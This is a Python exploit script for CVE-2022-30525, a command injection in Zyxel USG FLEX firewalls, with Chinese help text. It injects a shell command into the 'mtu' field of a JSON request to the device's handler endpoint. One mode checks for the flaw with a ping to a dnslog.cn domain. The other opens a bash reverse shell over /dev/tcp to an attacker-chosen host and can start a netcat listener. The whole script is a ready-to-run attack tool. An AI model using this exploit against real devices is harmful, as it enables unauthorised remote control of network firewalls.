import argparse
from http.client import ImproperConnectionState
import pstats
import random
import requests
import urllib3
import time
import sys
import json
import os
urllib3.disable_warnings()

def get_dnslog():
    t = random.random()
    url = f"http://www.dnslog.cn/getdomain.php?t={t}"
    res1 =res.get(url=url)
    if res1.status_code == 200 and "dnslog" in res1.text:
        return res1.text
    else:
        print("获取dnslog失败")

def get_data():
    t = random.random()
    url = f"http://www.dnslog.cn/getrecords.php?t={t}"
    res2 = res.get(url=url)
    if res2.status_code == 200 and "dnslog" in res2.text:
        return res2.text
    else:
        print("获取dnslog失败")

def check():
    dnslog1 = get_dnslog()
    interactive_exp = ";ping " + dnslog1 + ";"
    poc(url, interactive_exp)
    dnslog2 = str(get_data())
    if dnslog1 in dnslog2:
        print("漏洞存在")
        sys.exit(0)
    else:
        print("漏洞不存在")
        sys.exit(0)

def poc(url, command):
    time.sleep(1)
    # interactive_exp = ";bash -c 'exec bash -i &>/dev/tcp/" + args.lhost + '/' + str(args.lport) + " <&1';"
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0',
               'Content-Type': 'application/json; charset=utf-8'}
    data = {
        'command': 'setWanPortSt',
        'proto': 'dhcp',
        'port': '1270',
        'vlan_tagged': '1270',
        'vlanid': '1270',
        'mtu': command,
        'data': ''
    }
    try:
        rsp = requests.post(url=url, headers=headers, data=json.dumps(data), verify=False,timeout=5)
        print(rsp.status_code)
        if rsp.status_code == 503:
            print('[+] Executing netcat listener')

        else:
            print("[-] Exploitation failed.")
            sys.exit(0)

    except:
        pass
def getIpInFile():  #批量检测
    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2022-30525 Zyxel USG FLEX handler 远程命令执行漏洞--by luckyZ")
    parser.add_argument('-rh', action="store", dest="rhost", required=True,help="目的ip")
    parser.add_argument('-rp', action="store", dest="rport", type=int, help="目的端口（默认端口443）", default="443")
    #parser.add_argument('-dns', action="store", dest="dnsUrl", help="dnslog地址")
    parser.add_argument('-lh', action="store", dest="lhost", help="本地回连ip")
    parser.add_argument('-lp', action="store", dest="lport", type=int, help="本地回连端口（默认端口4444）", default="4444")
    parser.add_argument('-pro', action="store", dest="protocol", help="目标地址协议（https:// or http://）（默认协议https）",
                        default="https://")
    parser.add_argument('-f',action="store",dest='file',help='批量检测')
    parser.add_argument('--exec', action="store_true", dest='interactive', help='是否进入交互模式(参数为空)')
    parser.add_argument('--check',action="store_true",dest='check',help="dnslog检测")
    parser.add_argument('--nc-path', action="store", dest="ncpath", help="nc路径（默认路径/usr/bin/nc）", default="/usr/bin/nc")
    args = parser.parse_args()
    res = requests.session()
    url = args.protocol + args.rhost + ":" + str(args.rport) + "/ztp/cgi-bin/handler"

    if args.check == True:
        check()
    else:
        interactive_exp = ";bash -c 'exec bash -i &>/dev/tcp/" + args.lhost + '/' + str(args.lport) + " <&1';"
        if args.interactive == False:
            print("非交互模式，请手动开启netcat进行监听，IP ：" + args.lhost + "  端口 ：" + str(args.lport))
            poc(url, interactive_exp)
            sys.exit(0)
        elif args.interactive == True:
            print('[+] netcat监听，nc路径 ：' + args.ncpath)
            os.execv(args.ncpath, [args.ncpath, '-lvnp ' + str(args.lport)])
            poc(url, interactive_exp)
            sys.exit(0)
        else:
            print("请将‘-in’选项置空")
            sys.exit(1)


# 参考：https://github.com/jbaines-r7/victorian_machinery/blob/main/victorian_machinery.py
#      https://github.com/Henry4E36/CVE-2022-30525
